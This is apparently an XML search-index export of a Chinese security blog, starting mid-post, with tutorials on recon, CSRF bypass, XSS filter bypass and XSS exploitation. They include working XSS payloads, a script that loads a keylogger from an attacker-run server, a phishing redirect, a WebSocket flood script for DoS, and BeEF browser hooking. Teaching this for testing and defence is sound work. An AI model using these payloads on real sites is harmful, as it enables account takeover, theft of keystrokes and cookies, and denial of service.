tumblr.com</code></p><p>&#8195;5.通过证书查询</p><p>&#8195;<code>https://crt.sh/?q=%.tumblr.com</code></p><p><img src="/images/crt.png" alt="crt"></p><p>&#8195;<code>https://censys.io/certificates?q=parsed.names%3Atumblr.com</code></p><p><img src="/images/censys.png" alt="censys"></p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>&#8195;1.在线网站识别</p><p>&#8195;<code>http://www.yunsee.cn/</code></p><p>&#8195;2.浏览器插件<code>Wappalyzer</code></p><p> <img src="/images/wappalzer.png" alt="wappalzer"></p><h2 id="Google-Dork"><a href="#Google-Dork" class="headerlink" title="Google Dork"></a>Google Dork</h2><p><code>https://github.com/nerrorsec/GoogleDorker</code></p><p>&#8195;这款工具会根据你输入的域名生成规则，并以域名为html文件名生成一个页面，下载到本地访问后</p><p><img src="/images/googledork.png" alt="googledork"></p><h2 id="web目录"><a href="#web目录" class="headerlink" title="web目录"></a>web目录</h2><p>&#8195;1.kali linux里自带的<code>dirb、dirbuster、wfuzz</code></p><p>&#8195;2.<code>dirsearch</code> <code>https://github.com/maurosoria/dirsearch</code></p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>&#8195;这个字典里啥都有，挺好用的：<code>https://github.com/danielmiessler/SecLists?source=post_page-----ec25f7f12e6d----------------------</code></p><h2 id="绕CDN"><a href="#绕CDN" class="headerlink" title="绕CDN"></a>绕CDN</h2><p>&#8195;1.验证CDN的存在</p><p>&#8195;&#8195;首先我们先确定网站是否存在CDN，使用在线网站<code>https://www.17ce.com/site/index</code>当你发现解析ip不一样，那么就是存在CDN。</p><p><img src="/images/ping.png" alt="ping"></p><p>&#8195;2.绕过CDN获取真实ip</p><p>&#8195;&#8195;还是使用刚才内个在线网站，挨个去访问我们收集到的子域名，总会有那么几个站是没有cdn的。</p><p>&#8195;&#8195;在注册网站的时候，网站会给我们发邮箱，可通过检查电子邮件原文查找Received字段获取服务器的真实ip</p><p>&#8195;&#8195;使用工具<code>https://github.com/m0rtem/CloudFail、https://github.com/vincentcox/bypass-firewalls-by-DNS-history</code>，如何使用都有介绍，我就不说了</p><p>&#8195;&#8195;DNS历史解析记录可能会有真实ip<code>https://dnsdb.io/zh-cn/、https://x.threatbook.cn/</code></p><h2 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h2><p>&#8195;在我们获取到他真实ip后，我们就可以进行c段扫描了</p><p>&#8195;首先先探测主机存活<code>nmap -sn -PE -n ip/24</code></p><p>&#8195;获取到存活ip后进行全端口的扫描<code>nmap -sS -Pn -p 1-65535 -n ip</code></p><p>&#8195;为什么这样做我应该就不用说了，我相信你们懂</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;目前感觉有OneForAll这款工具就够用了，但还是写一款自己用的自动化脚本用起来会比较顺手，so，但愿自己能在年前把这个脚本写出来</p>]]></content>
      
      
      <categories>
          
          <category> recon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF_bypass和案例</title>
      <link href="/2019/12/05/CSRF_2/"/>
      <url>/2019/12/05/CSRF_2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=29713635&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>1.<strong>使用其他人的CSRF令牌</strong></p><p>&#8195;当应用程序不验证csrf令牌是否绑定到这个账户时，可以自己尝试去验证这一点：首先用账户a登录到网站，转到密码更改页面，使用burp抓取csrf令牌。使用账户B登录网站，并修改账户B的密码，在修改时抓包修改csrf令牌，如果成功就证明可以使用他人的csrf令牌。</p><p>2.<strong>替换相同长度的值</strong></p><p>&#8195;首先我们先确定令牌的长度，例如长度为21个字符，令牌为<code>ud019eh10923213213123</code>,我们可以替换为具有相同值的令牌<code>ud019eh10832121321223</code></p><p>3.<strong>删除CSRF令牌</strong></p><p>&#8195;尝试进行敏感操作的时候把令牌删掉，看看是否可以操作成功。</p><p>5.<strong>使用令牌固定部分</strong></p><p>&#8195;对比两个csrf令牌，相同部分为固定的，反之为动态部分，通常情况下只要固定部分为正确的就可以使用这个令牌</p><p>6.<strong>改变请求方式</strong></p><p>&#8195;例如我们在修改密码的时候是Get请求，那么我们在伪造请求的时候，就通过Post的方式发送。</p><p>7.<strong>绕Referer</strong></p><p>&#8195;web应用程序有的时候会验证referer，例如目标网站叫<code>www.abc.com</code>，我们就可以创建一个目录叫<code>www.abc.com</code>，这样的话就有可能绕过验证</p><p>&#8195;也可以尝试删除referer</p><p>8.<strong>xss+csrf</strong></p><p>&#8195;利用xss去获取令牌，然后进行csrf攻击</p><p>9.<strong>CLRF+CSRF</strong></p><p>&#8195;利用CLRF漏洞去固定cookie，然后进行csrf攻击</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>1.<strong>通过两个漏洞进行账户接管</strong></p><p>&#8195;现在假设uri为<code>example.com</code>,我们在这个网站上发现可以添加电子邮箱，可利用此邮箱接收重置密码链接。现在我们尝试添加邮箱时删除csrf令牌，看是否可以添加成功，果然，尽管没有csrf令牌，也是可以添加成功的，现在我们就可以构造payload，当用户访问，就可以更改邮箱了，但是我们发现，在成功修改后会提示修改成功，这样我们就暴露了，经过一番研究后发现，当我们修改邮箱时，uri为：<code>https://www.example.com/account/addEmail?email_ref=A3Ig_klkdfnw&amp;st=2E67C2F5B0AF8DE90&amp;redirect_url=email_settings</code>当我们把参数<code>redirect_url=email_settings</code>更改为<code>redirect_url=home</code>后，添加完邮箱就会跳转到主页，这样我们就不会暴露了，所以我们只需要把这两个漏洞结合在一起就可以完成一次完美的攻击了</p><p>2.<strong>csrf导致的账户接管</strong></p><p>&#8195;此csrf漏洞是在绑定电子邮箱和账户名处，从而导致账户接管，作者发现在修改邮箱时会验证csrf令牌，如果删除就会失败，当他把这个post请求改为get请求后，就能成功绕过，这样的话只要任意用户访问我们的恶意链接，我们就可以修改他的邮箱，和用户名，这看起来很简单，但是他获得了2400美金</p><p>3.<strong>XSS与CSRf的利用，导致账户接管</strong></p><p>&#8195;首先是发现了一个<code>self-xss</code>，然后发现修改密码处需要csrf令牌，作者通过self-xss窃取csrf令牌，并同时写入到csrf payload 页面，并跳转过去，这样的话就可以成功的修改密码</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;本来打算在后面写个jsonp劫持和cors劫持，但是我现在打算用接下来3天的时间写一个recon脚本，打算设计两种功能，一、快速获取子域名，二、可能会很慢但是会比较全的收集子域名，我也不知道我这3天能否完成，但是我想试试</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/</code></p><p><code>https://shahmeeramir.com/methods-to-bypass-csrf-protection-on-a-web-application-3198093f6599</code></p><p><code>https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee</code></p><p><code>https://medium.com/@sherazkhalid_60362/account-takeover-by-chaining-two-vulnerabilities-bb447753b089</code></p><p><code>https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/?__cf_chl_jschl_tk__=e0ddfe35f9fb4ef32043413ca483e9b149455471-1575553647-0-AeSewmjyKNq9ZRBYRR5iIan4ybMNYpiYyWMVRIl8YVutVTQTrcu1YKrPp8HPfMHGgTGxokpcwpijA1sUjUCpWaw_ibLemtVW338Gre0CyqBEEUlCbhQsVLA3DkwVeqtQTSoOu25DWzVNWKdhPbrnV5P6XHuDncrcwYlcW5C-c1Hz6Xv_nyyUcyGtDKqKhxwinGRSOt9de8YC3DRIgCu5NUEulQ18Q06qxXDgO-lQjDArIRNLoOreXoEJUiUdyVGnLPSzfJL7F4dj8yzzqLYj5FzKh-YUdlfXtV-B3_kNiM79g7nOZ6Y9TFD3EmCJtyVyLw</code></p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF_1</title>
      <link href="/2019/12/05/CSRF_1/"/>
      <url>/2019/12/05/CSRF_1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1301909440&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;当web应用没有对用户的一些敏感操作（修改密码，添加用户等）进行二次验证，导致攻击者可以构造恶意文件或链接，当用户在存在漏洞网站的认证<code>身份信息没有失效时</code>，访问了恶意链接，就会在受害者不执行的情况下，以受害者的身份向服务器发送请求，完成一些非法操作的攻击行为。</p><p>&#8195;没明白的小伙伴请看下面的图解</p><p><img src="/images/csrf.png" alt="csrf"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>&#8195;1.<strong>修改密码</strong></p><p>&#8195;&#8195;当我们在修改密码的时候，发现url中存在我们输入的密码（有的时候是post传输的，所有需要抓包观察）</p><p><img src="/images/csrfmi.png" alt="csrf"></p><p>&#8195;&#8195;我们尝试修改一下url中密码</p><p><img src="/images/csrfmi1.png" alt="csrf"></p><p>&#8195;&#8195;访问后发现提示密码修改了</p><p><img src="/images/csrfmi2.png" alt="csrfmi2"></p><p>&#8195;&#8195;我们可以创建一个1.html文件</p><p><img src="/images/csrfmi3.png" alt="csrfmi2"></p><p>&#8195;&#8195;当用户访问到该页面就会被修改密码，他还不知道！！</p><p>&#8195;2.<strong>添加管理员</strong></p><p>&#8195;&#8195;espcmsv5版本后台有个添加管理员</p><p><img src="/images/csrft.png" alt="csrfmi2"></p><p>&#8195;&#8195;我尝试添加一个用户，并抓包分析，发现是通过post传输的，所以我们需要构建一个表单来完成此次攻击</p><p><img src="/images/csrft1.png" alt="csrfmi2"></p><p>&#8195;&#8195;我们来创建一个esp1.html</p><p><img src="/images/csrft2.png" alt="csrfmi2"></p><p>&#8195;&#8195;当管理员访问后，就会成功添加管理员用户</p><p><img src="/images/csrft3.png" alt="csrfmi2"></p><p><code>其实不光这两种利用方式，像添加文件啊，转账啊，凡事用户的敏感操作没有进行二次验证的都有可能受到攻击</code></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;验证referer字段</p><p>&#8195;添加一次性且随机的token</p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_案例</title>
      <link href="/2019/12/03/XSS_2/"/>
      <url>/2019/12/03/XSS_2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1312925425&auto=0&height=66"></iframe><h3 id="文件上传XSS"><a href="#文件上传XSS" class="headerlink" title="文件上传XSS"></a>文件上传XSS</h3><p>1.上传html文件</p><p>&#8195;文件内容为xss的payload</p><p>&#8195;<code>&lt;svg/onload=alert(1)&gt;</code></p><p>&#8195;上传成功后去访问就会触发</p><p>2.上传svg文件</p><p>&#8195;svg文件内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>&#8195;同样只要能访问到就可以触发</p><h2 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h2><p>1.一个有在线聊天的网站，发送的聊天内容为xss payload</p><p><img src="/images/xsschat.png" alt="xsschat"></p><p><img src="/images/xsschat2.png" alt="xsschat"></p><p>2.绕过XSS filter</p><p>&#8195;当输入简单的payload:</p><p>&#8195;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>&#8195;发现请求被WAF阻止，经过各种尝试发现，当输入：</p><p>&#8195;<code>o&lt;x&gt;nmouseover=alert&lt;x&gt;1//</code></p><p>&#8195;尖括号与之间的内容被删除，仅剩下<code>onmouseover=alert(1)//</code>并弹出一个xss</p><p>&#8195;这个案例的话就是测试一下waf会对我们输入的内容怎么处理，根据处理方式进行一种利用，进而绕过，当我们遇到一个xss点，一定要多尝试，不要输入俩payload就觉得服务器已经防的死死的，多尝试，多研究，终会绕过的。</p><p>3.错误页面反应的XSS</p><p>&#8195;假设我们现在访问了一段url</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=../../../../etc/passwd</code></p><p>&#8195;出现了以下错误页面</p><p><img src="/images/xssbc.png" alt="xssbc"></p><p>&#8195;我们可以发现，url中file=后面的内容在页面中显示了出来</p><p>&#8195;我们接着尝试插入html标记，测试一下有没有filter</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;h1&gt;asu</code></p><p><img src="/images/xssbc2.png" alt="xssbc"></p><p>&#8195;很显然，并没有filter,我们只需插入xss payload就可以了</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;img src=x onmouseover=alert(1)&gt;</code></p><p><img src="/images/xssbc3.png" alt="xssbc"></p><p>4.url的xss与google dork的故事</p><p>&#8195;假设目标网站是<code>www.example.com</code>，我们使用google <code>site:*.example.com inurl:redirect</code></p><p>&#8195;当我们找到名为<code>example.com/social?redirect=/somewhere</code>时可以尝试<code>Open redirect</code>或XSS</p><p>&#8195;当重定向到白名单url成功后，就可以尝试xss：<code>example.com/social?redirect=javascript://alert(1)</code>,访问后可能会重定向别的地方，按正常用户流程走，可能会触发xss</p><p>&#8195;这个案例就是说我们拿到一个网站后，用google dork一下，发现open redirect 的点后，就在redirect后面添加</p><p>&#8195;简单的javascript urI：<code>javascript://alert(1)</code>去尝试一下。</p><p>5.绕过filter</p><p>&#8195;当网站把<code>&quot;&quot;</code>过滤为<code>&quot;</code>,把<code>&gt;</code>过滤为<code>&amp;gt</code>，我们的payload中就不能使用符号<code>&quot; &lt; &gt;</code></p><p>&#8195;我们就得一点点尝试，然后看<code>response</code>什么样，根据响应结果来修改payload</p><p>&#8195;当payload:时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=&apos;)&#125;hello&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/xssf.png" alt="xssf"></p><p>&#8195;当payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);</span><br></pre></td></tr></table></figure><p><img src="/images/xssf1.png" alt="xssf"></p><p>&#8195;这里没有触发是因为<code>&#39;)</code>未闭合，所有我们再修改一下payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a= 1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);(‘</span><br></pre></td></tr></table></figure><p><img src="/images/xssf2.png" alt="xssf"></p><p><img src="/images/xssf3.png" alt="xssf"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>还是内句话，遇到waf要多尝试，1小时不行就2小时，2小时不行就3小时，不要随便试试就放弃</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资源收集</title>
      <link href="/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/"/>
      <url>/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="此贴不定时更新一些有用的小脚本小工具好网站"><a href="#此贴不定时更新一些有用的小脚本小工具好网站" class="headerlink" title="此贴不定时更新一些有用的小脚本小工具好网站"></a>此贴不定时更新一些有用的小脚本小工具好网站</h1><p><code>https://github.com/gwen001/pentest-tools/blob/master/dnsexpire.py</code> 此脚本可检测域名到期时间，可利用此脚本检测子域名接管。</p><p><code>https://www.giftofspeed.com/cache-checker/</code></p>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS bypass</title>
      <link href="/2019/12/02/XSS%20bypass/"/>
      <url>/2019/12/02/XSS%20bypass/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=27890306&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>&#8195;1.hex编码</p><p><img src="/images/xssbp.png" alt></p><p>&#8195;2.大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;  ————》 &lt;sCriPt&gt;AlERt(1)&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure><p>&#8195;3.空格回车Tab</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.拆分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.Unicode编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert进行Unicode编码后\u0061\u006c\u0065\u0072\u0074</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;6.不使用括号</p><p>有的时候我们的（）会被过滤掉，那么我们就可以用throw来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;  //这个在chrome里会出现一个uncaught错误，我们可以使用一下payload</span><br><span class="line">&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;7.不使用&lt;&gt;</p><p>当输入点在input便签里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;XSStest&quot; type=text&gt;</span><br><span class="line">可以尝试</span><br><span class="line">&quot; autofocus onfocus=alert(1)//</span><br></pre></td></tr></table></figure><p>bypass的方式有很多，我就不一一列举了，可以尝试使用下面的payload去fuzz一下</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">https://github.com/payloadbox/xss-payload-list</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_利用</title>
      <link href="/2019/11/25/XSS_1/"/>
      <url>/2019/11/25/XSS_1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1300527847&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p><img src="/images/xsslc.jpg" alt></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>&#8195;反射型</p><p>&#8195;&#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发</p><p>&#8195;存储型</p><p>&#8195;&#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发</p><p>&#8195;DOM型</p><p>&#8195;&#8195;这是一种特殊类型的反射型xss，基于DOM文档对象模型的一种漏洞</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>&#8195;1.盗取cookie</p><p>&#8195;2.网页钓鱼</p><p>&#8195;&#8195;可使用setookit这个工具克隆网站，然后插入payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;windows.location=&quot;http://uip/&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;&#8195;当用户访问到存在漏洞的页面，就会跳转到你克隆的页面，输入的内容会在服务器上显示</p><p>&#8195;3.键盘记录</p><p>&#8195;&#8195;在咱们自己的服务器网站根目录下创建Keylogger.js文件</p><p><img src="/images/keylogger.png" alt="keylogger"></p><p>&#8195;&#8195;再创建keylogger.php文件，并保存在同一个目录下。</p><p><img src="/images/keyloggerphp.png" alt="keyloggerphp"></p><p>&#8195;&#8195;接着创建一个空的keylog.txt文件，并赋予其相应的可写权限。</p><p>&#8195;&#8195;在存在漏洞的网站插入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://uip/Keylogger.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.DOS攻击</p><p>&#8195;如果你发现存储型的xss，并把这段恶意代码插入到目标网站，只要有用户访问到这个点，就会主动去请求连接要攻击的ip地址，站小流量小的话没啥危害，要是内种流量很大的网站，对目标ip会有很大的危害。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript”&gt;</span><br><span class="line"></span><br><span class="line">while (true)&#123; </span><br><span class="line"></span><br><span class="line">var ws = new WebSocket(&quot;ws://要攻击的IP地址:端口”);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.利用beef软件进行攻击</p><p>&#8195;&#8195;首先我们开启beef，第一个标红处的代码需要你把他插入的目标网站，第二段标红处需要你自己访问</p><p><img src="/images/xssbeef.png" alt="xssbeef"></p><p>&#8195;当有人访问了存在xss的页面后，我们的beef就会显示出来</p><p><img src="/images/xssbeef1.png" alt="xssbeef"></p><p>&#8195;这个<code>logs</code>里记录的是用户鼠标键盘的一些操作：</p><p><img src="/images/xssbeef2.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Details</code> 里记录的是对方的操作系统、浏览器版本、cookie等信息</p><p><img src="/images/xssbeef3.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Commands</code>里是可以发送命令给主机，英文看不懂的自行翻译</p><p><img src="/images/xssbeef4.png" alt="xssbeef"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;开启HttpOnly</p><p>&#8195;输入过滤 输出编码</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
